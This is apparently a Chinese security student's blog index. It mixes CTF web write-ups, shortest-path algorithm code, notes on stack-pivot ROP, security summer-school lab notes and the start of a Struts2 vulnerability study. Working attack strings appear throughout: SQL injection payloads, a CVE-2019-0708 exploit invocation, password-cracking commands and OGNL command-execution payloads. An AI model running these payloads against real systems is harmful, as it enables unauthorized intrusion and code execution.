($_GET['password'])) { if ($_GET['password'] == $_SESSION['password']) die ('Flag: '.$flag); else print '&lt;p&gt;Wrong guess.&lt;/p&gt;';}mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt; 这里要求参数password和session中的password相同，而且是弱等号，所以当我们清空cookie，什么都不填直接提交时，弱等号比较必定返回true。 FALSE数组绕过SHA1碰撞。 NSCTF web200根据加密函数写解密函数，这里感觉用PHP比用Python要简单一点： 123456789101112131415&lt;?phpfunction decode($str) { $_o = base64_decode(strrev(str_rot13($str))); $_ = ''; for ($_0 = 0; $_0 &lt; strlen($_o); ++$_0) { $_c = substr($_o, $_0, 1); $__ = ord($_c) - 1; $_c = chr($__); $_ .= $_c; } return strrev($_);}echo decode('a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws');?&gt; 这里的技巧是rot13加密两次后会恢复出原来的明文，所以其解密和加密用的是同一个函数。 程序逻辑问题F12发现index.txt，核心代码： 12345678910111213141516171819202122232425262728&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) { $conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;); mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;); if ($conn-&gt;connect_error) { die(&quot;Connection failed: &quot; . mysql_error($conn));}$user = $_POST[user];$pass = md5($_POST[pass]);$sql = &quot;select pw from php where user='$user'&quot;;$query = mysql_query($sql);if (!$query) { printf(&quot;Error: %s\\n&quot;, mysql_error($conn)); exit();}$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) { echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;}else { echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); }}?&gt; 这里会将pass参数MD5后赋值给pass变量，但username没有过滤，存在注入。构造payload： 1username=-1' union select md5(1)#&amp;password=1 使得pass的值经过MD5后与查询结果相同，即可登录。 what a fuck!这是什么鬼东西?jsfuck直接控制台运行。 PHP大法根据提示拿到源码： 12345678910111213&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) { echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit();}$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;){ echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;;}?&gt; 二次URL编码绕过。 貌似有点难XFF头伪造IP为1.1.1.1。 头有点大修改请求头中的User-agent和Accept-Language： 12User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; .NET CLR 9.9)Accept-Language: en-gb,en;q=0.9 猫抓老鼠抓包发现异常字段Content-Row，长得像base64但并不需要解码，直接填在pass_key里提交就好。 看起来有点难这题如果不用admin登录，会显示数据库连接失败，看起来就像题被打了一样。 所以跑sqlmap用的url中，用户名必须是admin，比如http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin&amp;pass=admin&amp;action=login。其它没有什么坑点。","link":"/post/ShiYanBaWeb/"},{"title":"最短路问题相关","text":"Dijkstra, Bellman-Ford &amp;&amp; SPFA. EOJ 3196 Wormholes其实就是判断图中是否有负环……SPFA或者Bellman-Ford判负环。写的时候还不会SPFA，所以这里用的Bellman-Ford。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;bits/stdc++.h&gt;using namespace std;const int N = 505;const int M = 2550;const int INF = 1e6;int n, m, k, cnt, dis[N];struct node {int u, v, w;}e[M&lt;&lt;1];void add_edge(int uu, int vv, int ww){ e[cnt].u = uu; e[cnt].v = vv; e[cnt++].w = ww;}bool bellman_ford(){ int i; for (i = 1; i &lt;= n; ++i) dis[i] = INF; for (i = 1; i &lt; n; ++i) { bool flag = 0; for (int j = 1; j &lt;= cnt; ++j) if (dis[e[j].v] &gt; dis[e[j].u] + e[j].w) { dis[e[j].v] = dis[e[j].u] + e[j].w; flag = 1; } if (!flag) break; } for (i = 1; i &lt;= cnt; ++i) if (dis[e[i].v] &gt; dis[e[i].u] + e[i].w) return 1; return 0;}int main(){ int t, u, v, w; cin &gt;&gt; t; while (t--) { cin &gt;&gt; n &gt;&gt; m &gt;&gt; k; cnt = 1; while (m--) { cin &gt;&gt; u &gt;&gt; v &gt;&gt; w; add_edge(u, v, w); add_edge(v, u, w); } while (k--) { cin &gt;&gt; u &gt;&gt; v &gt;&gt; w; add_edge(u, v, -w); } cout &lt;&lt; (bellman_ford() ? &quot;YES&quot; : &quot;NO&quot;) &lt;&lt; endl; } return 0;} EOJ 3202 Roadblocks求次短路的模板题。用dist,dist2分别保存最短路和次短路，用dijkstra更新这两个数组，最后dist2[n-1]就是答案。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;bits/stdc++.h&gt;using namespace std;const int N = 5010;const int INF = 0x3f3f3f3f;int n, m, dist[N], dist2[N];struct edge {int to, cost;};typedef pair&lt;int, int&gt; P;vector&lt;edge&gt; g[N];void dijkstra(){ priority_queue&lt;P, vector&lt;P&gt;, greater&lt;P&gt; &gt; q; fill(dist, dist + n, INF); fill(dist2, dist2 + n, INF); dist[0] = 0; q.push(P(0, 0)); while (!q.empty()) { P p = q.top(); q.pop(); int v = p.second, d = p.first; if (dist2[v] &lt; d) continue; for (int i = 0; i &lt; g[v].size(); ++i) { edge &amp;e = g[v][i]; int d2 = d + e.cost; if (dist[e.to] &gt; d2) { swap(dist[e.to], d2); q.push(P(dist[e.to], e.to)); } if (dist2[e.to] &gt; d2 &amp;&amp; dist[e.to] &lt; d2) { dist2[e.to] = d2; q.push(P(dist2[e.to], e.to)); } } }}int main(){ int u, v, w; while (cin &gt;&gt; n &gt;&gt; m) { for (int i = 0; i &lt; n; ++i) g[i].clear(); for (int i = 0; i &lt; m; ++i) { cin &gt;&gt; u &gt;&gt; v &gt;&gt; w; g[u-1].push_back((edge){v-1, w}); g[v-1].push_back((edge){u-1, w}); } dijkstra(); cout &lt;&lt; dist2[n-1] &lt;&lt; endl; } return 0;} EOJ 3197 Invitation Cards 有编号1～P的站点， 有Q条公交车路线，公交车路线只从一个起点站直接到达终点站，是单向的，每条路线有它自己的车费。有P个人早上从1出发，他们要到达每一个公交站点， 然后到了晚上再返回点1。 求所有人来回的最小费用之和。 去的时候比较容易，就是求单源最短路；回来时是求多点到单点的最短路，考虑反向建图，那么问题也化为求单源最短路。两次spfa即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;bits/stdc++.h&gt;using namespace std;const int N = 1e6 + 10;const int INF = 0x3f3f3f3f;typedef long long ll;int n, m, head1[N], head2[N], dis[N], t1, t2;bool vis[N];struct node {int u, v, w, next;} edge1[N&lt;&lt;1], edge2[N&lt;&lt;1];ll spfa(node edge[], int head[]){ for (int i = 1; i &lt;= n; ++i) dis[i] = INF, vis[i] = 0; queue&lt;int&gt; q; q.push(1); dis[1] = 0, vis[1] = 1; while (!q.empty()) { int u = q.front(); q.pop(); vis[u] = 0; for (int i = head[u]; ~i; i = edge[i].next) { int v = edge[i].v; if (dis[v] &gt; edge[i].w + dis[u]) { dis[v] = edge[i].w + dis[u]; if (!vis[v]) vis[v] = 1, q.push(v); } } } ll ans = 0; for (int i = 1; i &lt;= n; ++i) ans += dis[i]; return ans;}void add_edge(int u, int v, int w){ edge1[t1].v = v; edge1[t1].w = w; edge1[t1].next = head1[u]; head1[u] = t1++; edge2[t2].v = u; edge2[t2].w = w; edge2[t2].next = head2[v]; head2[v] = t2++;}int main(){ int t, u, v, w; cin &gt;&gt; t; while (t--) { cin &gt;&gt; n &gt;&gt; m; t1 = t2 = 0; memset(head1, -1, sizeof(head1)); memset(head2, -1, sizeof(head2)); for (int i = 0; i &lt; m; ++i) { cin &gt;&gt; u &gt;&gt; v &gt;&gt; w; add_edge(u, v, w); } cout &lt;&lt; spfa(edge1, head1) + spfa(edge2, head2) &lt;&lt; endl; } return 0;}","link":"/post/ShortestPath/"},{"title":"栈迁移可视化的尝试","text":"参考CTF-Wiki画的一些图。 在栈溢出空间较小时，我们无法在栈上放下ROP链，这时往往会考虑将栈转移到其它可执行的地方（如bss段/data段），这种技术称为栈迁移。栈迁移一般可以分为stack pivoting和frame faking，前者主要关注esp（我们以32位为例，64位同理），而后者关注ebp和esp。 stack pivoting这种方法比较简单，因为只改变esp，因此利用条件也比较严格。这种方法适用于栈上可以执行shellcode，但无法泄露shellcode地址的情况。 假设现在NX关闭，我们首先将shellcode输入到字符数组里，这里假设shellcode的长度大于溢出长度，而小于字符数组长度加溢出长度。 然后，我们需要一些能够控制esp的gadgets，例如pop esp/add esp,??/sub esp,??等等。我们还需要jmp esp这个gadget。接下来布置栈： 12345678910| sub esp,0x??; jmp esp | -----------------------| jmp esp | -----------------------| saved ebp | &lt;- ebp -----------------------| padding | -----------------------| shellcode | &lt;- esp ----------------------- 注意这里的shellcode是可以覆盖掉saved ebp的，我们并不关心它的值，当然此时也就不需要padding了。 现在我们没有shellcode地址，但是我们知道栈上的偏移是固定的。因此我们接下来要做的就是让esp指向shellcode然后jmp过去，就可以执行shellcode了。sub esp,0x??的偏移量可以根据payload计算得到。 容易产生疑惑的是这里又用一个jmp esp覆盖了返回地址。我们来看一下函数返回时会发生什么： 12345678910111213141516 -----------------------| | &lt;- ebp| || || ... | -----------------------| sub esp,0x??; jmp esp | -----------------------| jmp esp | &lt;- esp -----------------------| saved ebp | -----------------------| padding | -----------------------| shellcode | ----------------------- 首先会弹出局部变量、saved ebp等。此时ebp恢复到上个栈帧基址。 接下来要弹出返回地址并设置eip为返回地址，此时有： 12345678910| sub esp,0x??; jmp esp | &lt;- esp -----------------------| jmp esp | -----------------------| saved ebp | -----------------------| padding | -----------------------| shellcode | ----------------------- 此时才会执行jmp esp，那么程序控制流就跳转到了sub esp,0x??; jmp esp这条语句的地址上，从而执行该语句，这样esp就指向了shellcode并执行了。 frame faking这种方法更常见，利用难度也高于上面那种，但是不需要关闭NX，可直接构造ROP链。 假设一个比较经典的情况，也就是ret2libc：我们将ROP链拆分成2段，其中第一段泄露libc，第二段执行system(&quot;/bin/sh&quot;)。这两段我们分别称之为target1和target2。首先，我们需要程序有一个存在栈溢出漏洞的读入操作，我们输入构造好的内容使得栈如图所示： 12345678910111213141516| 0x100 | -----------| fake ebp1 | -----------| 0 | -----------| leave_ret | -----------| read | -----------| fake ebp1 | &lt;- ebp -----------| || padding || | &lt;- esp ----------- 这里的read函数及leave_ret上方的三个参数不是必需的，只要有办法向fake ebp1位置写入内容即可，而这个位置由我们自己选定（通常在bss段/data段）。换句话说，我们最少只需要两个单元（32位8字节，64位16字节）的栈溢出，或者说只需要能覆盖到返回地址，就可以实现迁移。 那么leave_ret是什么呢？这条汇编语句等价于： 12mov esp, ebp;pop ebp; 并且，该语句在函数返回时本身就会执行。当我们将它填在返回地址后，这条语句就会被执行2次。 第一次执行先看leave： mov esp, ebp将esp指向ebp指向的位置： 123456789101112| 0x100 | -----------| fake ebp1 | -----------| 0 | -----------| leave_ret | -----------| read@plt | -----------| fake ebp1 | &lt;- ebp &lt;- esp ----------- pop ebp弹出fake ebp1，赋值给ebp： 123456789101112| 0x100 | -----------| fake ebp1 | -----------| 0 | -----------| leave_ret | -----------| read@plt | &lt;- esp -----------| fake ebp1 | fake ebp1 -&gt; | ... | &lt;- ebp ----------- ----- **然后ret**，执行read函数后返回到下一个leave_ret继续执行。这里我们通过read可以向fake ebp1位置写入target1： 123456789101112131415161718 | 0x100 | ---------------- | fake ebp2 | ---------------- | 0 | ---------------- | leave_ret | ---------------- | read@plt | ---------------- | puts@got | ---------------- | pop ebx; ret | ---------------- | puts@plt | ----------------fake ebp1 -&gt; | fake ebp2 | &lt;- ebp ---------------- 这里的read与leave_ret和我们第一次构造的原理类似，fake ebp2与fake ebp1类似。我们稍后就能看到为什么需要先填一个fake ebp2。 至此，我们为第一次栈迁移作好了准备。 第二次执行先看leave： mov esp, ebp将esp指向ebp指向的位置，即fake ebp1： 123456789101112131415161718 | 0x100 | ---------------- | fake ebp2 | ---------------- | 0 | ---------------- | leave_ret | ---------------- | read@plt | ---------------- | puts@got | ---------------- | pop ebx; ret | ---------------- | puts@plt | ----------------fake ebp1 -&gt; | fake ebp2 | &lt;- ebp &lt;- esp ---------------- pop ebp弹出fake ebp2，赋值给ebp： 123456789101112131415161718 | 0x100 | ---------------- | fake ebp2 | ---------------- | 0 | ---------------- | leave_ret | ---------------- | read@plt | ---------------- | puts@got | ---------------- | pop ebx; ret | ---------------- | puts@plt | &lt;- esp ----------------fake ebp1 -&gt; | fake ebp2 | fake ebp2 -&gt; | ... | &lt;- ebp ---------------- ----- 至此我们已经完成了第一次栈迁移。 **然后ret**执行target1，泄露libc。接着执行read后再次返回到leave_ret。这里我们通过read可以向fake ebp2位置写入target2： 12345678 | addr of /bin/sh | ----------------- | 0xdeadbeef | ----------------- | system@plt | -----------------fake ebp2 -&gt; | 0xdeadbeef | &lt;- ebp ----------------- 这样就为第二次栈迁移作好了准备。接下来第二次栈迁移的过程就和第一次相同了。因为我们这里只演示两次迁移，因此原本应该填fake ebp3的地方填成了0xdeadbeef，实际上依然可以填一个有效的可写地址继续进行第三次栈迁移。 总结可以看到，栈迁移的根本目标是改变esp，只不过stack pivoting用gadgets直接更改，而frame faking通过修改rbp，借助leave_ret来修改rsp，达到类似伪造栈帧的效果。","link":"/post/StackMigrationVisualize/"},{"title":"ECNU X 启明星辰 网络安全暑期学校记录","text":"7.22-7.26 Day1 &amp; Day2概念介绍和比较基本的漏洞利用。 可能需要补的东西 协议&amp;路由相关知识：TCP/IP卷一，CCNA/CCNP学习指导 安全技能证书 PHP代码审计工具 PHP SQL 工具的使用 …… CVE-2019-0708获取脚本：https://www.exploit-db.com/exploits/46946，命名为poc.py。 在Win7靶机上开启3389端口（计算机-&gt;属性-&gt;远程设置-&gt;允许所有...），并通过ipconfig查看IP。 最后终端运行： 1python poc.py 靶机IP 靶机位数 其中靶机IP为上面获得的IP，靶机位数为32或64。 其余CVE利用过程都基于MSF，比较套路。 Day3Web方向。 Level4扫后台发现存在备份文件index.php.bak，得PHP代码： 123456789&lt;?phpERROR_REPORTING(0);if(!empty($_GET['ver'])==PHP_VERSION){ if($_GET['ver']==PHP_VERSION){ $key = &quot;**********&quot;; }}?&gt; burp抓包发现返回头中有X-Powered-By: PHP/5.4.41，那么把ver=5.4.41作为参数通过GET请求发送即可。 Level5F12在注释中发现存在password.txt，查看发现是一个字典，放到Intruder里跑出密码为Nsf0cuS，然后登录。不过前端有js限制了密码长度，修改js即可，或者也可以直接Burp发包。 登陆成功后，在Set-Cookie字段中发现newpage=MjkwYmNhNzBjN2RhZTkzZGI2NjQ0ZmEwMGI5ZDgzYjkucGhw;，base64解码得290bca70c7dae93db6644fa00b9d83b9.php，访问。 在留言板界面任意留言并抓包，发现存在一个isLogin=0的Cookie和userlevel=guest的参数，分别修改为1和root即可。 Level6240610708和QNKCDZO的MD5值相同。 Level7根据加密函数写解密程序decode.php： 1234567891011121314151617&lt;?phpfunction decode($s) { $_ = base64_decode(strrev(str_rot13($s))); $_o = ''; for ($_0 = 0; $_0 &lt; strlen($_); ++$_0) { $_c = substr($_, $_0, 1); $__ = ord($_c) - 1; $_c = chr($__); $_o .= $_c; } return strrev($_o);}echo decode($_GET['str']);?&gt; 然后本机开个服务器（我的是8082端口），decode.php放在www目录里，访问http://localhost:8082/decode.php?str=pJovuTsWOUrtIJZtcKZ2OJMzEJZyMTLdIas即可。 Level8check.js是packer加密，直接去掉eval放控制台跑一下得到js源码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859_f = function () { var f = document.createElement(&quot;form&quot;); document.getElementById('login').appendChild(f); f.name = &quot;login&quot;; return f}();_uname = function () { var uname = document.createElement(&quot;input&quot;); uname.type = &quot;text&quot;; uname.id = &quot;uname&quot;; uname.value = 'Input Username'; uname.style.margin = &quot;0px 0px 0px 60px&quot;; _f.appendChild(uname); uname.onfocus = function () { if (this.value == 'Input Username') this.value = '' }; uname.onblur = function () { if (this.value == '') this.value = 'Input Username' }; return uname}();_br = function () { var br = document.createElement(&quot;br&quot;); _f.appendChild(br); br = document.createElement(&quot;br&quot;); _f.appendChild(br); return br}();_upass = function () { var upass = document.createElement(&quot;input&quot;); upass.type = &quot;password&quot;; upass.id = &quot;upass&quot;; upass.value = 'Input Password'; upass.style.margin = &quot;0px 0px 0px 60px&quot;; _f.appendChild(upass); upass.onfocus = function () { if (this.value == 'Input Password') this.value = '' }; upass.onblur = function () { if (this.value == '') this.value = 'Input Password' }; return upass}();_btn = function () { var btn = document.createElement(&quot;input&quot;); _f.appendChild(btn); btn.type = &quot;button&quot;; btn.value = &quot;login&quot;; btn.onclick = function () { uname = document.getElementById('uname').value; upass = document.getElementById('upass').value; if (uname == &quot;&quot;) alert('Please Input Username!'); else if (upass == &quot;&quot;) alert('Please Input Password!'); else { eval(unescape(&quot;var%20strKey1%20%3D%20%22JaVa3C41ptIsAGo0DStAff%22%3B%0Avar%20strKey2%20%3D%20%22CaNUknOWThIsK3y%22%3B%0Avar%20strKey3%20%3D%20String.fromCharCode%2871%2C%2048%2C%20111%2C%20100%2C%2033%29%3B%0Aif%20%28uname%20%3D%3D%20%28strKey3%20+%20%28%28%28strKey1.toLowerCase%28%29%29.substring%280%2C%20strKey1.indexOf%28%220%22%29%29%20+%20strKey2.substring%282%2C%206%29%29.toUpperCase%28%29%29.substring%280%2C%2015%29%29%29%20%7B%0A%20%20%20%20var%20strKey4%20%3D%20%27Java_Scr1pt_Pa4sW0rd_K3y_H3re%27%3B%0A%20%20%20%20if%20%28upass%20%3D%3D%20%28strKey4.substring%28strKey4.indexOf%28%271%27%2C%205%29%2C%20strKey4.length%20-%20strKey4.indexOf%28%27_%27%29%20+%205%29%29%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28%27Login%20Success%21%27%29%3B%0A%20%20%20%20%20%20%20%20document.getElementById%28%27key%27%29.innerHTML%20%3D%20unescape%28%22%253Cfont%2520color%253D%2522%2523000%2522%253Ea2V5X0NoM2NrXy50eHQ%3D%253C/font%253E%22%29%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20alert%28%27Password%20Error%21%27%29%3B%0A%20%20%20%20%7D%0A%7D%20else%20%7B%0A%20%20%20%20alert%28%27Login%20Failed%21%27%29%3B%0A%7D&quot;)) } }; return false}(); 只有最后一个else里的代码比较重要，去掉eval运行得： 1234567891011121314var strKey1 = &quot;JaVa3C41ptIsAGo0DStAff&quot;;var strKey2 = &quot;CaNUknOWThIsK3y&quot;;var strKey3 = String.fromCharCode(71, 48, 111, 100, 33);if (uname == (strKey3 + (((strKey1.toLowerCase()).substring(0, strKey1.indexOf(&quot;0&quot;)) + strKey2.substring(2, 6)).toUpperCase()).substring(0, 15))) { var strKey4 = 'Java_Scr1pt_Pa4sW0rd_K3y_H3re'; if (upass == (strKey4.substring(strKey4.indexOf('1', 5), strKey4.length - strKey4.indexOf('_') + 5))) { alert('Login Success!'); document.getElementById('key').innerHTML = unescape(&quot;%3Cfont%20color%3D%22%23000%22%3Ea2V5X0NoM2NrXy50eHQ=%3C/font%3E&quot;); } else { alert('Password Error!'); }} else { alert('Login Failed!');} 依次运行：1. 1234var strKey1 = &quot;JaVa3C41ptIsAGo0DStAff&quot;;var strKey2 = &quot;CaNUknOWThIsK3y&quot;;var strKey3 = String.fromCharCode(71, 48, 111, 100, 33);var strKey4 = 'Java_Scr1pt_Pa4sW0rd_K3y_H3re'; 2. 1strKey3 + (((strKey1.toLowerCase()).substring(0, strKey1.indexOf(&quot;0&quot;)) + strKey2.substring(2, 6)).toUpperCase()).substring(0, 15) 3. 1strKey4.substring(strKey4.indexOf('1', 5), strKey4.length - strKey4.indexOf('_') + 5) 得到用户名G0od!JAVA3C41PTISAGO和密码1pt_Pa4sW0rd_K3y_H3re，不过不用登录，因为key也可以直接得到。运行unescape(&quot;%3Cfont%20color%3D%22%23000%22%3Ea2V5X0NoM2NrXy50eHQ=%3C/font%3E&quot;)，得到： 1&lt;font color=&quot;#000&quot;&gt;a2V5X0NoM2NrXy50eHQ=&lt;/font&gt; base64解码得key_Ch3ck_.txt，打开发现里面只有Ch3ck_Au7h.php，但是打开发现只显示Your username error!。因此我们POST刚才得到的用户名和密码。 Level10提示LFI，并且html表单中有一个file参数，因此考虑用PHP伪协议，输入框中输入： 1php://filter/read=convert.base64-encode/resource=index.php flag直接写死在源码中了。。 Level11存在备份文件index.php.swp： 123456789101112131415161718192021222324252627282930function clear($string){ //这是过滤函数哦~}$userInfo = @unserialize($_REQUEST['userInfo']);$query = 'SELECT * FROM users WHERE id = \\''.clear($userInfo['id']).'\\' AND password = \\''.clear($userInfo['pass']).'\\';';$result = mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1){ die('Invalid password!');}$row = mysql_fetch_assoc($result);foreach($row as $key =&gt; $value){ $userInfo[$key] = $value;}$oldPass = @$_REQUEST['oldPass'];$newPass = @$_REQUEST['newPass'];if($oldPass == $userInfo['password']){ $userInfo['password'] = $newPass; $query = 'UPDATE users SET pass = \\''.clear($newPass).'\\' WHERE id = \\''.clear($userInfo['id']).'\\';'; mysql_query($query); echo 'Password Changed Success.&lt;br&gt;';}else{ echo 'Invalid old password entered.';} 首先对userInfo进行反序列化，随后要求两个参数oldPass和newPass，后者随意设置，前者很容易得到。在Cookie中发现pass=OTA0OGM1MGUwOTJmM2IyZWRlYzM5NTFiZjdiZGFlNTA%3D; id=3，进行base64解码和md5解密后得到oldPass=20151231。 最后就是在payload中构造一个序列化的userInfo数组，payload: 1changepassword.php?userInfo=a:2:{s:2:&quot;id&quot;;i:1;s:4:&quot;pass&quot;;s:8:&quot;20151231&quot;;}&amp;oldPass=20151231&amp;newPass=11111111 Level12备份文件index.php.： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php#GOAL: get password from admin;error_reporting(0);require 'DB_config_inc.php';dvwaDatabaseConnect();$_CONFIG['Security']=true;//if register globals = on, undo var overwritesforeach(array('_GET','_POST','_REQUEST','_COOKIE') as $method){ foreach($$method as $key=&gt;$value){ unset($$key); }}function clear($string){ //filter function here}$username = isset($_POST['username']) ? clear($_POST['username']) : die('Please enter in a username.');$password = isset($_POST['password']) ? clear($_POST['password']) : die('Please enter in a password.');if($_CONFIG['Security']){ $username=preg_replace('#[^a-z0-9_-]#i','',$username); $password=preg_replace('#[^a-z0-9_-]#i','',$password);}if (is_array($username)){ foreach ($username as $key =&gt; $value) { $username[$key] = $value; }}$query='SELECT * FROM users WHERE user=\\''.$username[0].'\\' AND password=\\''.$password.'\\';';$result=mysql_query($query);if($result &amp;&amp; mysql_num_rows($result) &gt; 0){ echo('flag:{*********}'); exit();}else{ echo(&quot;&lt;script&gt;alert(\\&quot;Invalid password!\\&quot;)&lt;/script&gt;&quot;); exit();}?&gt; 如果$_CONFIG['security']为true，那么我们无法传入username和password，因此需要覆盖$_CONFIG。随后就是注入了，payload: 1username='&amp;password=||1=1#&amp;Submit=%E6%8F%90%E4%BA%A4&amp;_CONFIG=aaa Level13经测试，只有php5后缀的文件可以上传成功，但是经过一段很短的延时后又会被删掉。所以需要写两个脚本，一个上传一个下载同时进行，最后发现下载下来的刚才上传的文件里包含flag。 Day4 &amp; Day5练习赛，没来得及记录具体writeup，靠回忆整理一点工具的使用。 John破解DES12john des.txtjohn --show des.txt John破解Windows管理员密码注：Windows下散列函数为NTLM。 1john --format=NT sam.txt Python库Steganography命令行使用12steganography -e input.jpg output.jpg 'flag{..}'steganography -d stego.png F5-Steganography使用1java Extract stego.jpg -p 123456 steghide使用12steghide embed -cf picture.jpg -ef secret.txtsteghide extract -sf picture.jpg 图片隐写压缩包/图片12copy /b 1.jpg+1.zip new.jpgcopy /b 2.jpg+3.jpg 23.jpg RSA-已知p,q,e如果只知道n且n位数不大，可以在线分解得p,q。 12345678import gmpy2p = ...q = ...e = ...c = ... # c = pow(m, e, p*q)d = gmpy2.invert(e, (p-1)*(q-1))m = pow(c, d, p*q) Misc-未知领域例如对于流量包，vmdk文件，apk文件等等不熟悉的文件的分析，部分简单题可以通过文本编辑器打开并搜索字符串。对于损坏的流量包尤为有效。 哈希还原给定明文范围和哈希前十个字符，求明文与哈希值。简陋的php版本： 1234567891011121314151617&lt;?php$str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';$len = strlen($str);for($i = 0; $i &lt; $len-1; ++$i) { for($j = 0; $j &lt; $len-1; ++$j) { for($k = 0; $k &lt; $len-1; ++$k) { for($l = 0; $l &lt; $len-1; ++$l) { $ret = md5($str[$i].$str[$j].$str[$k].$str[$l]); if(substr($ret, 0, 10) == 'c2979c7124') { echo $ret; die(); } } } }}?&gt; 比较舒服的python版本： 1234567891011import hashlibimport itertoolskey = 'c2979c7124'dir = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'dir_list = itertools.product(dir, repeat=4)for i in dir_list: res = hashlib.md5(''.join(i)).hexdigest() if res[0:10] == key: print i print res SQL注入流量包分析 过滤出http数据包。 定位关键的注入数据包所在的区间，观察注入语句判断是否是盲注。 非盲注：关注响应信息，直接在响应信息中得到flag。 盲注：关注注入语句，导出HTTP对象到txt并写脚本分析出flag。 总结暑期学校主要还是面向零基础的同学，因此能学到的东西不算太多。接下来应该会重点学习各类工具的使用。","link":"/post/SummerSchool/"},{"title":"SwingMood 开发纪要","text":"基本告别开发了。 又一年双创，不知道为什么又报了，现在想来后悔不已，但也不是全无收获。 技术技术上，经过一天钢铁这类商业项目的锻炼，Quasar+Webpack+Vue全家桶已经用得比较熟了，SwingMood开发过程中更多是因为要适配移动端，进一步加深了对flexbox的理解。 比较有意思的是在项目进行时我同时也在实习，进行一些渗透测试的工作。渗透过程中，甲方开发用了一种很蠢的方式进行会话管理：使用IP标识一个账户。这对于攻击者来说简直是天大的福音，因此我们不禁去质询开发为什么要这样做，得到了如下回答： 前端采用了axios发起异步请求，后端本来采用session进行会话管理，这需要前端发起请求时带上Cookie。但当设置withCredential为true时，后端必须设置Access-Control-Allow-Credentials头；这时，Access-Control-Allow-Origin头必须是一个指定的源，不能为*。于是我们只能取消了session机制。 然而正确的做法是指定Access-Control-Allow-Origin头为一个或一组特定的源，例如http://localhost:8080等。实际生产环境中，可以指定为前端页面所在的源，这也是我们给出的修复建议。实际上，在SwingMood开发过程中我就遇到了完全相同的问题，前端开发经验总算派上了点用场。 剩下的是一些技术上的小进步： 处理跨域问题时，最方便的方法是直接使用webpack的开发服务器代理，将changeOrigin设置为true axios中对后端返回数据的处理，比较方便的方法是添加拦截器对res.data.code进行检查 深入学习并理解了Vue生命周期钩子的调用顺序 对于需要登录才可以访问的页面，最方便的处理方法是利用VuerRouter的beforeEach方法，检查页面的自定义属性 为了解决页面刷新丢失session的问题，可以监听beforeunload方法将Vuex的state存入sessionStorage，并在页面加载时取出。 由此可以看出我的Vue技术还有待提高，对底层原理的理解尚不到位。 管理在这次项目过程中我作为组长，需要协调好各队员间的工作。对于这类任务我并没有什么经验，因此这次做得不是特别好，导致项目进度耽误了一些。 下面关于项目流程的一些记录，以反映翻车的具体原因： 项目初期，我按各人意愿分配了任务 心理同学*2：阅读文献、提供理论支撑 熟悉前端的同学A：写后端（？） 熟悉后端的同学B：写前端（？） 我完成了app整体界面框架，用时3天 A提出想采用protobuf + grpc构建后端，由于项目本来就是为了学习新知识，我同意了 给B安排前端学习计划 和A一起调试奇怪的Golang专属问题 中间大约2个月的时间啥也没干 快答辩了，和心理的同学明确需求，修改前端界面，催后端 终于发现💊，互换A/B工作 后端变回Spring了，为了加速B的进度我甚至写了不少Java代码（？） 后端开发基本完成，大概用时1周多一点（？） 让心理同学收集素材，继续完善前后端 开发完成，打包遇到问题，又调试3天 搞定，写报告，提交 所以说作为管理者我是要背很大的锅的。。回顾整个项目流程，我感到十分迷惑。我觉得今后在进行任务分配时，应做到： 合理分配，即尽量根据队员所擅长的方面来分配对应的任务 设定严格的交付时间，以防止出现拖延的情况 对于需求中不明确的地方，应及时沟通，并尽可能做到在软件需求上明确无歧义","link":"/post/SwingMood/"},{"title":"struts2 漏洞学习","text":"包含 s2-001 / s2-003 / s2-005 / s2-007 / s2-008 / s2-009 / s2-012 / s2-013 / s2-014 / s2-015 / s2-016 / s2-045 / s2-046 / s2-048 / s2-052 / s2-053 / s2-057 s2-001参考 影响版本：2.0.0 - 2.0.8 用户提交表单失败时，提交的数据会被作为 OGNL 表达式执行，造成代码执行。 获取 tomcat 路径： 1%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;} 获取网站路径： 1%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()} 执行命令： 1%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;id&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} s2-003 | s2-005参考 影响版本：2.0.0 - 2.1.8.1 请求的 GET 参数会通过 OGNL 表达式被解析为 Java 语句。在 s2-003 